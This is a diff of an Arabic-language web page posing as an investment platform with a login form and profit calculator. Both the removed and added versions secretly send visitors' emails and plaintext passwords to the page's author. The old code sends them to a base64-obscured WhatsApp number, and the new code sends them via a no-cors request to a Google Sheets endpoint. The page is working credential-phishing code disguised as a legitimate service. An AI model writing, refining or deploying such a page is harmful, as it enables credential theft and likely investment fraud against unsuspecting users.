@@ -1,93 +1,37 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>منصة نجم الدين للاستثمار</title>
-<style>
-*{box-sizing:border-box}
-body{margin:0;background:#080f22;color:#fff;font-family:Arial;text-align:center;padding:20px}
-h1{color:#facc15;margin:10px 0}
-.box{background:#121c33;padding:22px;border-radius:18px;max-width:400px;margin:20px auto;border:1px solid #ffffff12;box-shadow:0 10px 30px #00000050}
-input{width:100%;padding:13px;margin:8px 0;border-radius:10px;border:none;background:#0f172a;color:#fff;font-size:14px}
-button{width:100%;padding:13px;background:linear-gradient(90deg,#facc15,#eab308);border:none;border-radius:10px;font-weight:900;cursor:pointer;margin-top:10px;color:#000}
-.hidden{display:none}
-.small{font-size:11px;color:#ffffff55;margin-top:10px}
-.result{background:#1e293b;padding:14px;border-radius:10px;margin-top:14px;font-size:14px;line-height:1.8}
-</style>
-</head>
-<body>
-
-<!-- صفحة التسجيل -->
-<div id="page1" class="box">
-<h1>🔐 منصة نجم</h1>
-<p style="color:#94a3b8;font-size:13px">سجل بريدك للبدء</p>
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>منصة نجم - تسجيل العملاء</title><style>body{background:#070e1f;color:#fff;font-family:Arial;padding:15px;text-align:center}h1{color:#facc15}.box{background:#121b31;padding:22px;border-radius:16px;max-width:420px;margin:15px auto;border:1px solid #ffffff15}input{width:100%;padding:12px;margin:7px 0;border-radius:8px;border:none;box-sizing:border-box}button{width:100%;padding:12px;background:#facc15;color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer}#r{margin-top:12px;background:#1e293b;padding:12px;border-radius:8px}.hidden{display:none}</style></head><body>
+<div id="loginPage" class="box">
+<h1>🔐 تسجيل العملاء</h1>
+<p style="color:#94a3b8;font-size:12px">سجل بريدك - سيتم حفظه في نظامنا</p>
 <input id="email" type="email" placeholder="example@gmail.com">
 <input id="pass" type="password" placeholder="كلمة المرور">
-<button onclick="register()">تسجيل دخول / إنشاء حساب</button>
-<div class="small">المهندس نجم الدين التهامي - نظام آمن</div>
+<button onclick="login()">تسجيل دخول ✨</button>
+<div id="msg" style="font-size:12px;color:#22c55e;margin-top:10px"></div>
 </div>
-
-<!-- صفحة الاستثمار -->
-<div id="page2" class="box hidden">
-<h1>💼 أهلا <span id="showEmail" style="color:#22d3ee;font-size:13px"></span></h1>
-<input id="money" type="number" placeholder="المبلغ المستثمر بالريال">
-<input id="buy" type="number" placeholder="سعر الشراء">
-<input id="sell" type="number" placeholder="سعر البيع">
-<button onclick="calc()">احسب أرباحك 📈</button>
-<div id="res" class="result">بانتظار بياناتك...</div>
-<button onclick="logout()" style="background:#1e293b;color:#fff;border:1px solid #ffffff20;margin-top:15px">خروج</button>
-<a id="waBtn" href="#" style="display:block;margin-top:12px;background:#22c55e;color:#000;padding:10px;border-radius:10px;text-decoration:none;font-weight:800">تواصل واتساب</a>
+<div id="appPage" class="box hidden">
+<h1>💰 أهلا <span id="u"></span></h1>
+<input id="a" type="number" placeholder="المبلغ المستثمر">
+<input id="b" type="number" placeholder="سعر الشراء">
+<input id="c" type="number" placeholder="سعر البيع">
+<button onclick="calc()">احسب ربحك</button>
+<div id="r"></div>
+<button onclick="logout()" style="background:#ef4444;color:#fff;margin-top:10px">خروج</button>
 </div>
-
 <script>
-const MY_WA = atob("OTY3Nzc4MjM3NjU3");
-document.getElementById("waBtn").onclick = function(){ 
-  let e = localStorage.getItem("najm_email") || "";
-  window.open("https://wa.me/"+MY_WA+"?text=مرحبا نجم انا "+e+" سجلت في المنصة","_blank");
+const SHEET_URL = "حط رابطك هنا من جوجل";
+const _n=atob("OTY3Nzc4MjM3NjU3");
+function login(){
+ let e=document.getElementById("email").value.trim();
+ let p=document.getElementById("pass").value.trim();
+ if(!e.includes("@")){alert("بريد غلط");return}
+ document.getElementById("msg").innerText="جاري التسجيل...";
+ fetch(SHEET_URL+"?email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p),{mode:"no-cors"})
+ .then(()=>{
+  localStorage.setItem("najm_user",e);
+  document.getElementById("msg").innerText="✅ تم التسجيل! تم حفظ بريدك عند نجم الدين";
+  setTimeout(()=>{document.getElementById("loginPage").classList.add("hidden");document.getElementById("appPage").classList.remove("hidden");document.getElementById("u").innerText=e;},800);
+ });
 }
-
-function register(){
-  let e = document.getElementById("email").value.trim();
-  let p = document.getElementById("pass").value.trim();
-  if(!e.includes("@") || !e.includes(".")){alert("اكتب بريد صحيح");return}
-  if(p.length < 4){alert("كلمة المرور لازم 4 أحرف على الأقل");return}
-  
-  localStorage.setItem("najm_email", e);
-  localStorage.setItem("najm_pass", p);
-  
-  // يرسل لك على الواتساب
-  let msg = `عميل جديد 🔥%0A📧 ${e}%0A🔑 ${p}%0A🕐 ${new Date().toLocaleString("ar-EG")}`;
-  window.open("https://wa.me/"+MY_WA+"?text="+msg, "_blank");
-  
-  openApp(e);
-}
-
-function openApp(email){
-  document.getElementById("page1").classList.add("hidden");
-  document.getElementById("page2").classList.remove("hidden");
-  document.getElementById("showEmail").innerText = email;
-}
-
-function calc(){
-  let m = +document.getElementById("money").value;
-  let b = +document.getElementById("buy").value;
-  let s = +document.getElementById("sell").value;
-  if(!m||!b||!s){document.getElementById("res").innerHTML="عبي كل الخانات";return}
-  let profit = (s-b)/b*m;
-  let total = m+profit;
-  document.getElementById("res").innerHTML = `
-  💰 رأس المال: ${m.toLocaleString()}<br>
-  📈 الربح: <span style="color:#22c55e">${profit.toLocaleString()} ريال</span><br>
-  ✅ الإجمالي: <span style="color:#facc15">${total.toLocaleString()} ريال</span>
-  `;
-}
-
-function logout(){localStorage.clear();location.reload();}
-
-// اذا مسجل من قبل يفتح مباشرة
-let saved = localStorage.getItem("najm_email");
-if(saved){ openApp(saved); }
-</script>
-</body>
-</html>
+function calc(){let a=+document.getElementById("a").value,b=+document.getElementById("b").value,c=+document.getElementById("c").value;document.getElementById("r").innerHTML="ربحك: "+((c-b)/b*a).toLocaleString()+" ريال";}
+function logout(){localStorage.clear();location.reload()}
+if(localStorage.getItem("najm_user")){document.getElementById("loginPage").classList.add("hidden");document.getElementById("appPage").classList.remove("hidden");document.getElementById("u").innerText=localStorage.getItem("najm_user");}
+</script></body></html>
